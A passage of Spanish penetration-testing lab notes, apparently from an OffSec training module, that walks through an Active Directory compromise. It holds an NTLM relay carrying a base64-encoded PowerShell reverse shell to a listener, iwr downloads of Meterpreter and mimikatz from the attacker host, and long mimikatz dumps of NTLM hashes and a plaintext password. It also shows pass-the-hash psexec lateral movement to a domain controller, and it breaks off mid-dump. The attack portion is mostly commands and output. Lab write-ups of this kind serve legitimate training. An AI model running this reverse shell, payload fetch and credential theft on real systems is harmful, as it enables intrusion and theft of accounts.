└─# impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.231.242 -c "powershell -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADIAMQAzACIALAA5ADkAOQA5ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAwACwAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQAKAA=="
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Protocol Client DCSYNC loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client RPC loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client SMTP loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server on port 445
[*] Setting up WCF Server on port 9389
[*] Setting up RAW Server on port 6666
[*] Multirelay disabled

[*] Servers started, waiting for connections
```
4. Cambiamos la url del backup en wordpres a `//192.168.45.213/test` y hacemos click en `save`
5. En nuestro receptor:
```bash
┌──(root㉿kali)-[/home/kali/OffSec/27-Assembling-The-Pieces/WINPREP]
└─# nc -lvnp 9999                     
listening on [any] 9999 ...
connect to [192.168.45.213] from (UNKNOWN) [192.168.231.242] 52340
whoami
nt authority\system
PS C:\Windows\system32> whoami 
nt authority\system
PS C:\Windows\system32> hostname
MAILSRV1
PS C:\Windows\system32> iwr -uri http://192.168.45.213:8000/met.exe -Outfile met.exe
PS C:\Windows\system32> Start-Process .\met.exe
PS C:\Windows\system32> cd C:\Users\Administrator
PS C:\Users\Administrator> iwr -uri http://192.168.45.213:8000/mimikatz.exe -Outfile mimikatz.exe
PS C:\Users\Administrator> .\mimikatz.exe
.\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::logonpasswords

Authentication Id : 0 ; 604274 (00000000:00093872)
Session           : Batch from 0
User Name         : Administrator
Domain            : MAILSRV1
Logon Server      : MAILSRV1
Logon Time        : 5/3/2025 12:31:16 PM
SID               : S-1-5-21-3952879524-1180826585-1433334954-500
        msv :
         [00000003] Primary
         * Username : Administrator
         * Domain   : MAILSRV1
         * NTLM     : 76821e8eeb84c0ec6446dbcc40ee2c99
         * SHA1     : d8dab7e916059ea33c6cf05fbbf007122ff32c75
        tspkg :
        wdigest :
         * Username : Administrator
         * Domain   : MAILSRV1
         * Password : (null)
        kerberos :
         * Username : Administrator
         * Domain   : MAILSRV1
         * Password : (null)
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 577229 (00000000:0008cecd)
Session           : Service from 0
User Name         : MSSQL$MICROSOFT##WID
Domain            : NT SERVICE
Logon Server      : (null)
Logon Time        : 5/3/2025 12:31:14 PM
SID               : S-1-5-80-1184457765-4068085190-3456807688-2200952327-3769537534
        msv :
         [00000003] Primary
         * Username : MAILSRV1$
         * Domain   : BEYOND
         * NTLM     : 3abb3b4f791b35ac1103b8ad26ff3490
         * SHA1     : 0be9fd45e3db79440a750253a38429c459b8edd6
        tspkg :
        wdigest :
         * Username : MAILSRV1$
         * Domain   : BEYOND
         * Password : (null)
        kerberos :
         * Username : MAILSRV1$
         * Domain   : beyond.com
         * Password : d7 dd 51 d9 59 50 8f 44 4d b4 88 bc 8e cc bf 33 d1 1e e1 6b c1 7f 94 14 08 81 bf cf 80 ca 31 0e db d6 97 d6 6a ac 65 09 4a 65 f0 0a 25 0c fd 29 dd 91 24 7b 94 04 79 d4 45 b7 b0 37 7a 3f 77 f9 7f 1a 3c 64 25 45 1f 2e 67 f8 82 2b 7c a0 68 06 42 ba 8e 49 94 35 b7 c1 e6 a7 1b 7c b5 a9 54 b9 73 2b f8 6d 7a b1 d8 fd b3 d3 c4 43 db 96 ad ce 99 ef b9 79 a6 2c 9f 32 e6 58 ea 06 0c 3d 85 38 95 03 b1 cc 02 39 7f 0e 0d b0 1d d9 5a 0a a4 86 f1 ab f2 13 6c c4 81 aa 54 04 3c d2 e1 39 50 ca 78 68 91 df f1 1f 49 35 56 7d ae 54 f4 54 c4 ce 96 67 5b 46 43 90 d0 f4 cb 11 0f 4d 2b 9e 3a b6 a7 06 58 dc 53 7e 9a 57 70 13 30 cc 07 cf f3 70 e2 5a f3 a3 50 85 32 2f d6 37 f5 90 5d 8d 3d 17 02 18 df 16 95 e6 10 99 6b f7 1d 00 5f d3 40 b3 
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 310592 (00000000:0004bd40)
Session           : Interactive from 1
User Name         : beccy
Domain            : BEYOND
Logon Server      : DCSRV1
Logon Time        : 5/3/2025 12:29:28 PM
SID               : S-1-5-21-1104084343-2915547075-2081307249-1108
        msv :
         [00000003] Primary
         * Username : beccy
         * Domain   : BEYOND
         * NTLM     : f0397ec5af49971f6efbdb07877046b3
         * SHA1     : 2d878614fb421517452fd99a3e2c52dee443c8cc
         * DPAPI    : 4aea2aa4fa4955d5093d5f14aa007c56
        tspkg :
        wdigest :
         * Username : beccy
         * Domain   : BEYOND
         * Password : (null)
        kerberos :
         * Username : beccy
         * Domain   : BEYOND.COM
         * Password : (null)
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 80982 (00000000:00013c56)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 5/3/2025 12:29:02 PM
SID               : S-1-5-90-0-1
        msv :
         [00000003] Primary
         * Username : MAILSRV1$
         * Domain   : BEYOND
         * NTLM     : 5e7c4434c6f8698e1368ec7993ff7014
         * SHA1     : 3545f6e2854628623020108a801f7caf8003e0a6
        tspkg :
        wdigest :
         * Username : MAILSRV1$
         * Domain   : BEYOND
         * Password : (null)
        kerberos :
         * Username : MAILSRV1$
         * Domain   : beyond.com
         * Password : c6 4b 0f 73 58 5b f5 86 fc 87 d3 c4 ea 62 b8 69 ec e2 cb 9a a2 47 5a be 46 ab 6d 50 1b 1f 3e e8 21 ea b1 40 12 50 ee c2 ab 79 be 47 e7 f4 ae c3 da 41 47 e7 02 d1 8e f5 c5 87 dc 6f 6c 9f dc 62 00 6b 71 c2 d3 6c bb 7d ab cb 9e 5c a9 8b 71 5a 60 08 42 8b 29 03 91 37 ca b9 99 30 8a 9d ec 56 4f 6b 12 ff 46 10 41 27 2e 67 ca 2e 1b 13 ba 26 ce d6 5f 27 54 66 97 a5 19 9d c1 fc c7 25 24 f9 18 19 03 f4 b0 2a 66 ca 52 7c 80 1b ce ad 37 4b d6 67 ea a5 fc 87 37 e1 60 be 16 9e e1 4d a4 f9 85 cc 3a d7 74 19 47 d1 df 25 d4 44 07 4d a7 56 99 bf 26 c3 1c 01 66 b1 c5 fb e7 62 51 01 82 2c f1 6d b4 10 62 3e f0 bf 13 53 de 2d c5 1b 11 18 df 0b 3d 5a 47 5b 82 d5 c3 a4 09 06 63 2c a5 a0 17 8f 5d d3 dc a4 ea 8f a8 52 61 da 4e 50 b7 c8 
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 80964 (00000000:00013c44)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 5/3/2025 12:29:02 PM
SID               : S-1-5-90-0-1
        msv :
         [00000003] Primary
         * Username : MAILSRV1$
         * Domain   : BEYOND
         * NTLM     : 3abb3b4f791b35ac1103b8ad26ff3490
         * SHA1     : 0be9fd45e3db79440a750253a38429c459b8edd6
        tspkg :
        wdigest :
         * Username : MAILSRV1$
         * Domain   : BEYOND
         * Password : (null)
        kerberos :
         * Username : MAILSRV1$
         * Domain   : beyond.com
         * Password : d7 dd 51 d9 59 50 8f 44 4d b4 88 bc 8e cc bf 33 d1 1e e1 6b c1 7f 94 14 08 81 bf cf 80 ca 31 0e db d6 97 d6 6a ac 65 09 4a 65 f0 0a 25 0c fd 29 dd 91 24 7b 94 04 79 d4 45 b7 b0 37 7a 3f 77 f9 7f 1a 3c 64 25 45 1f 2e 67 f8 82 2b 7c a0 68 06 42 ba 8e 49 94 35 b7 c1 e6 a7 1b 7c b5 a9 54 b9 73 2b f8 6d 7a b1 d8 fd b3 d3 c4 43 db 96 ad ce 99 ef b9 79 a6 2c 9f 32 e6 58 ea 06 0c 3d 85 38 95 03 b1 cc 02 39 7f 0e 0d b0 1d d9 5a 0a a4 86 f1 ab f2 13 6c c4 81 aa 54 04 3c d2 e1 39 50 ca 78 68 91 df f1 1f 49 35 56 7d ae 54 f4 54 c4 ce 96 67 5b 46 43 90 d0 f4 cb 11 0f 4d 2b 9e 3a b6 a7 06 58 dc 53 7e 9a 57 70 13 30 cc 07 cf f3 70 e2 5a f3 a3 50 85 32 2f d6 37 f5 90 5d 8d 3d 17 02 18 df 16 95 e6 10 99 6b f7 1d 00 5f d3 40 b3 
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : MAILSRV1$
Domain            : BEYOND
Logon Server      : (null)
Logon Time        : 5/3/2025 12:29:01 PM
SID               : S-1-5-20
        msv :
         [00000003] Primary
         * Username : MAILSRV1$
         * Domain   : BEYOND
         * NTLM     : 3abb3b4f791b35ac1103b8ad26ff3490
         * SHA1     : 0be9fd45e3db79440a750253a38429c459b8edd6
        tspkg :
        wdigest :
         * Username : MAILSRV1$
         * Domain   : BEYOND
         * Password : (null)
        kerberos :
         * Username : mailsrv1$
         * Domain   : BEYOND.COM
         * Password : d7 dd 51 d9 59 50 8f 44 4d b4 88 bc 8e cc bf 33 d1 1e e1 6b c1 7f 94 14 08 81 bf cf 80 ca 31 0e db d6 97 d6 6a ac 65 09 4a 65 f0 0a 25 0c fd 29 dd 91 24 7b 94 04 79 d4 45 b7 b0 37 7a 3f 77 f9 7f 1a 3c 64 25 45 1f 2e 67 f8 82 2b 7c a0 68 06 42 ba 8e 49 94 35 b7 c1 e6 a7 1b 7c b5 a9 54 b9 73 2b f8 6d 7a b1 d8 fd b3 d3 c4 43 db 96 ad ce 99 ef b9 79 a6 2c 9f 32 e6 58 ea 06 0c 3d 85 38 95 03 b1 cc 02 39 7f 0e 0d b0 1d d9 5a 0a a4 86 f1 ab f2 13 6c c4 81 aa 54 04 3c d2 e1 39 50 ca 78 68 91 df f1 1f 49 35 56 7d ae 54 f4 54 c4 ce 96 67 5b 46 43 90 d0 f4 cb 11 0f 4d 2b 9e 3a b6 a7 06 58 dc 53 7e 9a 57 70 13 30 cc 07 cf f3 70 e2 5a f3 a3 50 85 32 2f d6 37 f5 90 5d 8d 3d 17 02 18 df 16 95 e6 10 99 6b f7 1d 00 5f d3 40 b3 
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 50094 (00000000:0000c3ae)
Session           : Interactive from 0
User Name         : UMFD-0
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 5/3/2025 12:29:01 PM
SID               : S-1-5-96-0-0
        msv :
         [00000003] Primary
         * Username : MAILSRV1$
         * Domain   : BEYOND
         * NTLM     : 3abb3b4f791b35ac1103b8ad26ff3490
         * SHA1     : 0be9fd45e3db79440a750253a38429c459b8edd6
        tspkg :
        wdigest :
         * Username : MAILSRV1$
         * Domain   : BEYOND
         * Password : (null)
        kerberos :
         * Username : MAILSRV1$
         * Domain   : beyond.com
         * Password : d7 dd 51 d9 59 50 8f 44 4d b4 88 bc 8e cc bf 33 d1 1e e1 6b c1 7f 94 14 08 81 bf cf 80 ca 31 0e db d6 97 d6 6a ac 65 09 4a 65 f0 0a 25 0c fd 29 dd 91 24 7b 94 04 79 d4 45 b7 b0 37 7a 3f 77 f9 7f 1a 3c 64 25 45 1f 2e 67 f8 82 2b 7c a0 68 06 42 ba 8e 49 94 35 b7 c1 e6 a7 1b 7c b5 a9 54 b9 73 2b f8 6d 7a b1 d8 fd b3 d3 c4 43 db 96 ad ce 99 ef b9 79 a6 2c 9f 32 e6 58 ea 06 0c 3d 85 38 95 03 b1 cc 02 39 7f 0e 0d b0 1d d9 5a 0a a4 86 f1 ab f2 13 6c c4 81 aa 54 04 3c d2 e1 39 50 ca 78 68 91 df f1 1f 49 35 56 7d ae 54 f4 54 c4 ce 96 67 5b 46 43 90 d0 f4 cb 11 0f 4d 2b 9e 3a b6 a7 06 58 dc 53 7e 9a 57 70 13 30 cc 07 cf f3 70 e2 5a f3 a3 50 85 32 2f d6 37 f5 90 5d 8d 3d 17 02 18 df 16 95 e6 10 99 6b f7 1d 00 5f d3 40 b3 
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 50060 (00000000:0000c38c)
Session           : Interactive from 1
User Name         : UMFD-1
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 5/3/2025 12:29:01 PM
SID               : S-1-5-96-0-1
        msv :
         [00000003] Primary
         * Username : MAILSRV1$
         * Domain   : BEYOND
         * NTLM     : 3abb3b4f791b35ac1103b8ad26ff3490
         * SHA1     : 0be9fd45e3db79440a750253a38429c459b8edd6
        tspkg :
        wdigest :
         * Username : MAILSRV1$
         * Domain   : BEYOND
         * Password : (null)
        kerberos :
         * Username : MAILSRV1$
         * Domain   : beyond.com
         * Password : d7 dd 51 d9 59 50 8f 44 4d b4 88 bc 8e cc bf 33 d1 1e e1 6b c1 7f 94 14 08 81 bf cf 80 ca 31 0e db d6 97 d6 6a ac 65 09 4a 65 f0 0a 25 0c fd 29 dd 91 24 7b 94 04 79 d4 45 b7 b0 37 7a 3f 77 f9 7f 1a 3c 64 25 45 1f 2e 67 f8 82 2b 7c a0 68 06 42 ba 8e 49 94 35 b7 c1 e6 a7 1b 7c b5 a9 54 b9 73 2b f8 6d 7a b1 d8 fd b3 d3 c4 43 db 96 ad ce 99 ef b9 79 a6 2c 9f 32 e6 58 ea 06 0c 3d 85 38 95 03 b1 cc 02 39 7f 0e 0d b0 1d d9 5a 0a a4 86 f1 ab f2 13 6c c4 81 aa 54 04 3c d2 e1 39 50 ca 78 68 91 df f1 1f 49 35 56 7d ae 54 f4 54 c4 ce 96 67 5b 46 43 90 d0 f4 cb 11 0f 4d 2b 9e 3a b6 a7 06 58 dc 53 7e 9a 57 70 13 30 cc 07 cf f3 70 e2 5a f3 a3 50 85 32 2f d6 37 f5 90 5d 8d 3d 17 02 18 df 16 95 e6 10 99 6b f7 1d 00 5f d3 40 b3 
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 48912 (00000000:0000bf10)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 5/3/2025 12:29:00 PM
SID               : 
        msv :
         [00000003] Primary
         * Username : MAILSRV1$
         * Domain   : BEYOND
         * NTLM     : 3abb3b4f791b35ac1103b8ad26ff3490
         * SHA1     : 0be9fd45e3db79440a750253a38429c459b8edd6
        tspkg :
        wdigest :
        kerberos :
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 310880 (00000000:0004be60)
Session           : Interactive from 1
User Name         : beccy
Domain            : BEYOND
Logon Server      : DCSRV1
Logon Time        : 5/3/2025 12:29:28 PM
SID               : S-1-5-21-1104084343-2915547075-2081307249-1108
        msv :
         [00000003] Primary
         * Username : beccy
         * Domain   : BEYOND
         * NTLM     : f0397ec5af49971f6efbdb07877046b3
         * SHA1     : 2d878614fb421517452fd99a3e2c52dee443c8cc
         * DPAPI    : 4aea2aa4fa4955d5093d5f14aa007c56
        tspkg :
        wdigest :
         * Username : beccy
         * Domain   : BEYOND
         * Password : (null)
        kerberos :
         * Username : beccy
         * Domain   : BEYOND.COM
         * Password : NiftyTopekaDevolve6655!#!
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 995 (00000000:000003e3)
Session           : Service from 0
User Name         : IUSR
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 5/3/2025 12:29:02 PM
SID               : S-1-5-17
        msv :
        tspkg :
        wdigest :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        kerberos :
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 5/3/2025 12:29:02 PM
SID               : S-1-5-19
        msv :
        tspkg :
        wdigest :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        kerberos :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : MAILSRV1$
Domain            : BEYOND
Logon Server      : (null)
Logon Time        : 5/3/2025 12:29:00 PM
SID               : S-1-5-18
        msv :
        tspkg :
        wdigest :
         * Username : MAILSRV1$
         * Domain   : BEYOND
         * Password : (null)
        kerberos :
         * Username : mailsrv1$
         * Domain   : BEYOND.COM
         * Password : d7 dd 51 d9 59 50 8f 44 4d b4 88 bc 8e cc bf 33 d1 1e e1 6b c1 7f 94 14 08 81 bf cf 80 ca 31 0e db d6 97 d6 6a ac 65 09 4a 65 f0 0a 25 0c fd 29 dd 91 24 7b 94 04 79 d4 45 b7 b0 37 7a 3f 77 f9 7f 1a 3c 64 25 45 1f 2e 67 f8 82 2b 7c a0 68 06 42 ba 8e 49 94 35 b7 c1 e6 a7 1b 7c b5 a9 54 b9 73 2b f8 6d 7a b1 d8 fd b3 d3 c4 43 db 96 ad ce 99 ef b9 79 a6 2c 9f 32 e6 58 ea 06 0c 3d 85 38 95 03 b1 cc 02 39 7f 0e 0d b0 1d d9 5a 0a a4 86 f1 ab f2 13 6c c4 81 aa 54 04 3c d2 e1 39 50 ca 78 68 91 df f1 1f 49 35 56 7d ae 54 f4 54 c4 ce 96 67 5b 46 43 90 d0 f4 cb 11 0f 4d 2b 9e 3a b6 a7 06 58 dc 53 7e 9a 57 70 13 30 cc 07 cf f3 70 e2 5a f3 a3 50 85 32 2f d6 37 f5 90 5d 8d 3d 17 02 18 df 16 95 e6 10 99 6b f7 1d 00 5f d3 40 b3 
        ssp :
        credman :
        cloudap :
```
* Obtenemos con esto otra sesion meterpreter y ejecutamos mimikatz

#### Movimiento lateral

|user | hash | hostname | password | 
|-----|------|--------|--------|
| beccy | f0397ec5af49971f6efbdb07877046b3 | DCSRV1 | NiftyTopekaDevolve6655!#!| 
| Administrator| 76821e8eeb84c0ec6446dbcc40ee2c99 | MAILSRV1 |

1. impacket-psexec obtenemos de este shell una session meterpreter mas estable con met.exe
```bash
┌──(root㉿kali)-[/home/kali/OffSec/27-Assembling-The-Pieces]
└─# proxychains -q impacket-psexec -hashes 00000000000000000000000000000000:f0397ec5af49971f6efbdb07877046b3 beccy@172.16.187.240
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on 172.16.187.240.....
[*] Found writable share ADMIN$
[*] Uploading file xLXncqGl.exe
[*] Opening SVCManager on 172.16.187.240.....
[*] Creating service veLH on 172.16.187.240.....
[*] Starting service veLH.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.20348.1006]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32> 
```

2. MSF session 3

```bash
msf6 auxiliary(server/socks_proxy) > 
[*] Sending stage (203846 bytes) to 192.168.231.242
sessions

Active sessions
===============

  Id  Name  Type                     Information                     Connection
  --  ----  ----                     -----------                     ----------
  1         meterpreter x64/windows  BEYOND\marcus @ CLIENTWK1       192.168.45.213:443 -> 192.168.231.242:63275 (192.168.231.242)
  2         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ MAILSRV1  192.168.45.213:443 -> 192.168.231.242:53036 (192.168.231.242)
  3         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ DCSRV1    192.168.45.213:443 -> 192.168.231.242:63422 (172.16.187.240)

msf6 auxiliary(server/socks_proxy) > sessions -i 3
[*] Starting interaction with 3...

meterpreter > shell
Process 3268 created.
Channel 1 created.
Microsoft Windows [Version 10.0.20348.1006]
(c) Microsoft Corporation. All rights reserved.

C:\Users\Administrator>[*] Meterpreter session 3 opened (192.168.45.213:443 -> 192.168.231.242:63422) at 2025-06-25 18:50:59 -0300
whoami
whoami
nt authority\system

C:\Users\Administrator>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 3A2A-FEA4

 Directory of C:\Users\Administrator

06/25/2025  02:48 PM    <DIR>          .
09/27/2022  10:44 AM    <DIR>          ..
09/27/2022  10:44 AM    <DIR>          3D Objects
09/27/2022  10:44 AM    <DIR>          Contacts
09/27/2022  10:44 AM    <DIR>          Desktop
09/27/2022  10:44 AM    <DIR>          Documents
09/27/2022  10:44 AM    <DIR>          Downloads
09/27/2022  10:44 AM    <DIR>          Favorites
03/01/2023  07:37 AM             1,378 lab.ps1
09/27/2022  10:44 AM    <DIR>          Links
06/25/2025  02:48 PM             7,168 met.exe
09/27/2022  10:44 AM    <DIR>          Music
09/27/2022  10:44 AM    <DIR>          Pictures
09/27/2022  10:44 AM    <DIR>          Saved Games
09/27/2022  10:44 AM    <DIR>          Searches
09/27/2022  10:44 AM    <DIR>          Videos
               2 File(s)          8,546 bytes
              14 Dir(s)   7,622,844,416 bytes free

C:\Users\Administrator>powershell
powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Users\Administrator> iwr -uri http://192.168.45.213:8000/mimikatz.exe -Outfile mimikatz.exe
iwr -uri http://192.168.45.213:8000/mimikatz.exe -Outfile mimikatz.exe
PS C:\Users\Administrator> .\mimikatz.exe
.\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::logonpasswords

Authentication Id : 0 ; 82640 (00000000:000142d0)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 5/3/2025 12:21:15 PM
SID               : S-1-5-90-0-1
        msv :
         [00000003] Primary
         * Username : DCSRV1$
         * Domain   : BEYOND
         * NTLM     : 0d1d80f3cd5ca7910bb9262609dbd10d
         * SHA1     : 0d1949bff74e32996aaaa2174cd1c85d830d9e1f
        tspkg :
        wdigest :
         * Username : DCSRV1$
         * Domain   : BEYOND
         * Password : (null)
        kerberos :
         * Username : DCSRV1$
         * Domain   : beyond.com
         * Password : d8 22 6c d6 e3 10 b0 9f 0e 0d 11 e6 17 0c e1 9f 1b 76 33 0c da 47 74 30 57 ed 70 22 ce f8 d4 f4 d8 fe 84 3c d7 b1 e2 e2 c9 80 9a f3 eb 40 24 e3 6d 12 81 f0 fc 4c 92 f6 e3 1c e6 80 3a 12 ae 6e 5e 1d 22 76 d0 30 da 34 ad 0d 95 f5 8a 93 38 f7 1e ed 61 93 aa 2d 0b 65 77 e5 a7 34 60 d6 f7 5e af ce 29 19 60 16 3f 24 bb 6b 3a f7 47 67 c9 48 ae 29 0a a5 27 6f a0 b7 06 d3 3a 03 eb 6f cb 05 47 7f 7b c8 3c 34 f8 b7 d0 bc 74 3b a4 89 a0 a4 5b b2 77 d9 0f 15 ae 75 cc b8 9c f2 aa a9 eb ba 35 dd 0e 61 99 b0 a2 4e 11 28 d6 a7 59 cc 77 c7 36 30 8d 70 e4 41 81 e0 d3 89 d0 b6 79 d8 9f a4 38 72 a9 bd bf aa c3 91 e5 b4 75 9c bd 94 43 06 1e cb 3f d7 d2 65 fd a7 50 41 8b e2 c6 eb 10 a0 a1 cc ec 75 4b 4c c7 c2 fd b2 f4 5e 43 5f 8f 1a 
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : DCSRV1$
Domain            : BEYOND
Logon Server      : (null)
Logon Time        : 5/3/2025 12:21:15 PM
SID               : S-1-5-20
        msv :
         [00000003] Primary
         * Username : DCSRV1$
         * Domain   : BEYOND
         * NTLM     : 1f2b1955a41f26eb6b3f5d291e300ce9
         * SHA1     : 08ac59fd0552ae0c628f2c86409ff11da9bd9770
        tspkg :
        wdigest :
         * Username : DCSRV1$
         * Domain   : BEYOND
         * Password : (null)
        kerberos :
         * Username : dcsrv1$
         * Domain   : BEYOND.COM
         * Password : (null)
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 52299 (00000000:0000cc4b)
Session           : Interactive from 1
User Name         : UMFD-1
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 5/3/2025 12:21:15 PM
SID               : S-1-5-96-0-1
        msv :
         [00000003] Primary
         * Username : DCSRV1$
         * Domain   : BEYOND
         * NTLM     : 0d1d80f3cd5ca7910bb9262609dbd10d
         * SHA1     : 0d1949bff74e32996aaaa2174cd1c85d830d9e1f
        tspkg :
        wdigest :
         * Username : DCSRV1$
         * Domain   : BEYOND
         * Password : (null)
        kerberos :
         * Username : DCSRV1$
         * Domain   : beyond.com
         * Password : d8 22 6c d6 e3 10 b0 9f 0e 0d 11 e6 17 0c e1 9f 1b 76 33 0c da 47 74 30 57 ed 70 22 ce f8 d4 f4 d8 fe 84 3c d7 b1 e2 e2 c9 80 9a f3 eb 40 24 e3 6d 12 81 f0 fc 4c 92 f6 e3 1c e6 80 3a 12 ae 6e 5e 1d 22 76 d0 30 da 34 ad 0d 95 f5 8a 93 38 f7 1e ed 61 93 aa 2d 0b 65 77 e5 a7 34 60 d6 f7 5e af ce 29 19 60 16 3f 24 bb 6b 3a f7 47 67 c9 48 ae 29 0a a5 27 6f a0 b7 06 d3 3a 03 eb 6f cb 05 47 7f 7b c8 3c 34 f8 b7 d0 bc 74 3b a4 89 a0 a4 5b b2 77 d9 0f 15 ae 75 cc b8 9c f2 aa a9 eb ba 35 dd 0e 61 99 b0 a2 4e 11 28 d6 a7 59 cc 77 c7 36 30 8d 70 e4 41 81 e0 d3 89 d0 b6 79 d8 9f a4 38 72 a9 bd bf aa c3 91 e5 b4 75 9c bd 94 43 06 1e cb 3f d7 d2 65 fd a7 50 41 8b e2 c6 eb 10 a0 a1 cc ec 75 4b 4c c7 c2 fd b2 f4 5e 43 5f 8f 1a 
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 52281 (00000000:0000cc39)
Session           : Interactive from 0
User Name         : UMFD-0
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 5/3/2025 12:21:15 PM
SID               : S-1-5-96-0-0
        msv :
         [00000003] Primary
         * Username : DCSRV1$
         * Domain   : BEYOND
         * NTLM     : 0d1d80f3cd5ca7910bb9262609dbd10d
         * SHA1     : 0d1949bff74e32996aaaa2174cd1c85d830d9e1f
        tspkg :
        wdigest :
         * Username : DCSRV1$
         * Domain   : BEYOND
         * Password : (null)
        kerberos :
         * Username : DCSRV1$
         * Domain   : beyond.com
